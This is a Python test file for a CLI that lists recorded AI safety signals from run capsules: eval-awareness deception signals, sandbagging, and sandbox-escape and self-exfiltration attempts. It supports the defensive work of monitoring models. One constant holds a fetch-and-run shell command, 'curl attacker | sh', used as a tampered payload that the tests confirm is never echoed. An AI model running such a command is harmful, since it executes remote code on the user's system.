# Copyright 2024 NovaFabric Contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""``nova safety signal list`` (ADR-0167 P3, NF-354/355/356/358).

Exit-code contract: 0 whenever the capsule was read — *including* when a
successful sandbox escape was reported (reporting is not gating, I-1) — and 2
on input errors. Every output carries the in-mission-boundary line.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest
import yaml
from rich.console import Console
from typer.testing import CliRunner

from novafabric.cli import frontier_safety as cli_mod
from novafabric.cli.main import app
from novafabric.frontier_safety import (
    FACET_NAME,
    IN_MISSION_BOUNDARY,
    AutonomyAttempt,
    DeceptionSignal,
    ElicitationRecord,
    SandbaggingRecord,
    attach_facet,
    build_facet,
    digest_ref,
)

runner = CliRunner()

EXPLOIT = "curl attacker | sh"


def _write_capsule(root: Path, manifest: Any, name: str = "run-01") -> Path:
    capsule_dir = root / name
    capsule_dir.mkdir(parents=True)
    text = manifest if isinstance(manifest, str) else yaml.safe_dump(manifest)
    (capsule_dir / "capsule.yaml").write_text(text, encoding="utf-8")
    return capsule_dir


@pytest.fixture(autouse=True)
def _wide_console(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(cli_mod, "console", Console(width=200))


@pytest.fixture
def populated(tmp_path: Path) -> Path:
    facet = build_facet(
        deception_signals=[
            DeceptionSignal(
                signal_type="eval_awareness",
                detector_ref=digest_ref("detector"),
                evidence_digest=digest_ref("evidence"),
                verdict_ref=digest_ref("verdict-1"),
            )
        ],
        sandbagging_records=[
            SandbaggingRecord(
                elicitation_regime="fine_tuned",
                declared_ceiling_ref=digest_ref("ceiling"),
                observed_vs_declared="underperformed",
                verdict_ref=digest_ref("verdict-2"),
                verdict_source="red_team",
            )
        ],
        autonomy_attempts=[
            AutonomyAttempt(
                attempt_type="sandbox_escape",
                outcome="succeeded",
                report_ref=digest_ref("report-a"),
                attempt_count=2,
                verdict_ref=digest_ref("verdict-3"),
            ),
            AutonomyAttempt(
                attempt_type="self_exfiltration",
                outcome="detected",
                report_ref=digest_ref("report-b"),
                attempt_count=5,
                verdict_ref=digest_ref("verdict-4"),
            ),
        ],
        elicitation_records=[
            ElicitationRecord(elicitation_effort="scaffolded", elicitation_ref=digest_ref("elicit"))
        ],
    )
    manifest = attach_facet({"run_id": "run-01", "status": "completed"}, facet)
    return _write_capsule(tmp_path, json.loads(json.dumps(manifest)))


@pytest.fixture
def empty(tmp_path: Path) -> Path:
    return _write_capsule(tmp_path, {"run_id": "run-02", "status": "completed"}, "run-02")


def _squash(output: str) -> str:
    return " ".join(output.split())


def _invoke(*argv: str) -> Any:
    return runner.invoke(app, ["safety", "signal", "list", *argv])


# ── --help smoke ──────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "argv", [["safety", "signal", "--help"], ["safety", "signal", "list", "--help"]]
)
def test_help(argv: list[str]) -> None:
    result = runner.invoke(app, argv)
    assert result.exit_code == 0, result.output


def test_signal_is_mounted_on_the_existing_safety_group() -> None:
    result = runner.invoke(app, ["safety", "--help"])
    assert result.exit_code == 0
    for sub in ("control", "tripwire", "signal"):
        assert sub in result.output


# ── Output ────────────────────────────────────────────────────────────────


def test_text_lists_every_kind_and_exits_zero_on_a_reported_escape(populated: Path) -> None:
    result = _invoke("--capsule", str(populated))
    assert result.exit_code == 0, result.output
    out = _squash(result.output)
    assert _squash(IN_MISSION_BOUNDARY) in out
    assert "1 deception signal(s) (NF-354)" in out
    assert "1 sandbagging record(s) (NF-355)" in out
    assert "2 autonomy attempt record(s) (NF-356)" in out
    assert "1 elicitation record(s) (NF-358)" in out
    assert "succeeded" in out
    assert "Reported attempts in total: 7" in out
    assert "not a risk score" in out


def test_json_all_kinds(populated: Path) -> None:
    result = _invoke("--capsule", str(populated), "--json")
    assert result.exit_code == 0, result.output
    data = json.loads(result.output)
    assert data["boundary"] == IN_MISSION_BOUNDARY
    assert data["types"] == ["deception", "sandbagging", "autonomy", "elicitation"]
    assert data["deception_signals"][0]["verdict_source"] == "scheming_eval"
    assert data["sandbagging_records"][0]["verdict_source"] == "red_team"
    assert [a["attempt_count"] for a in data["autonomy_attempts"]] == [2, 5]
    assert data["total_attempt_count"] == 7
    assert data["elicitation_records"][0]["no_ceiling_computed"] is True
    assert "verdict" not in data["deception_signals"][0]  # no judgement of ours


@pytest.mark.parametrize(
    ("kind", "key"),
    [
        ("deception", "deception_signals"),
        ("sandbagging", "sandbagging_records"),
        ("autonomy", "autonomy_attempts"),
        ("elicitation", "elicitation_records"),
    ],
)
def test_type_filter_json(populated: Path, kind: str, key: str) -> None:
    result = _invoke("--capsule", str(populated), "--type", kind, "--json")
    assert result.exit_code == 0, result.output
    data = json.loads(result.output)
    assert data["types"] == [kind]
    signal_keys = {
        "deception_signals",
        "sandbagging_records",
        "autonomy_attempts",
        "elicitation_records",
    }
    assert signal_keys & set(data) == {key}
    assert ("total_attempt_count" in data) is (kind == "autonomy")


@pytest.mark.parametrize("kind", ["deception", "sandbagging", "autonomy", "elicitation"])
def test_type_filter_text(populated: Path, kind: str) -> None:
    result = _invoke("--capsule", str(populated), "--type", kind)
    assert result.exit_code == 0, result.output
    assert "(NF-35" in result.output


def test_type_filter_is_case_insensitive(populated: Path) -> None:
    result = _invoke("--capsule", str(populated), "--type", "AUTONOMY", "--json")
    assert result.exit_code == 0, result.output
    assert json.loads(result.output)["types"] == ["autonomy"]


def test_no_facet_is_not_an_error(empty: Path) -> None:
    result = _invoke("--capsule", str(empty))
    assert result.exit_code == 0, result.output
    out = _squash(result.output)
    assert _squash(IN_MISSION_BOUNDARY) in out
    assert "neither safe nor unsafe" in out
    as_json = json.loads(_invoke("--capsule", str(empty), "--json").output)
    assert as_json["autonomy_attempts"] == []
    assert as_json["total_attempt_count"] == 0


def test_partial_kinds_report_the_missing_ones(tmp_path: Path) -> None:
    facet = build_facet(
        elicitation_records=[
            ElicitationRecord(elicitation_effort="typical", elicitation_ref=digest_ref("e"))
        ]
    )
    manifest = json.loads(json.dumps(attach_facet({"run_id": "r"}, facet)))
    result = _invoke("--capsule", str(_write_capsule(tmp_path, manifest)))
    assert result.exit_code == 0, result.output
    out = _squash(result.output)
    assert "No deception signal(s) (NF-354) recorded." in out
    assert "1 elicitation record(s) (NF-358)" in out
    assert "Reported attempts in total" not in out


def test_resolves_a_bare_run_id(populated: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("NOVAFABRIC_CAPSULE_DIR", str(populated.parent))
    result = _invoke("--capsule", "run-01", "--json")
    assert result.exit_code == 0, result.output
    assert len(json.loads(result.output)["autonomy_attempts"]) == 2


# ── Input errors → exit 2 ─────────────────────────────────────────────────


def test_unknown_type_exits_2(populated: Path) -> None:
    assert _invoke("--capsule", str(populated), "--type", "scheming").exit_code == 2


def test_missing_capsule_exits_2(tmp_path: Path) -> None:
    result = _invoke("--capsule", str(tmp_path / "nope" / "x"))
    assert result.exit_code == 2
    assert _squash(IN_MISSION_BOUNDARY) in _squash(result.output)


@pytest.mark.parametrize(
    "manifest",
    [
        {
            "facets": {
                FACET_NAME: {
                    "autonomy_attempts": [
                        {
                            "attempt_type": "sandbox_escape",
                            "outcome": "succeeded",
                            "report_ref": digest_ref("r"),
                            "attempt_count": 1,
                            "verdict_ref": digest_ref("v"),
                            "exploit_steps": [EXPLOIT],
                        }
                    ]
                }
            }
        },
        {
            "facets": {
                FACET_NAME: {
                    "elicitation_record": {
                        "elicitation_effort": "typical",
                        "elicitation_ref": digest_ref("e"),
                        "no_ceiling_computed": False,
                    }
                }
            }
        },
    ],
)
def test_tampered_facet_exits_2_without_echoing_the_payload(tmp_path: Path, manifest: Any) -> None:
    result = _invoke("--capsule", str(_write_capsule(tmp_path, manifest)))
    assert result.exit_code == 2, result.output
    assert _squash(IN_MISSION_BOUNDARY) in _squash(result.output)
    assert EXPLOIT not in result.output
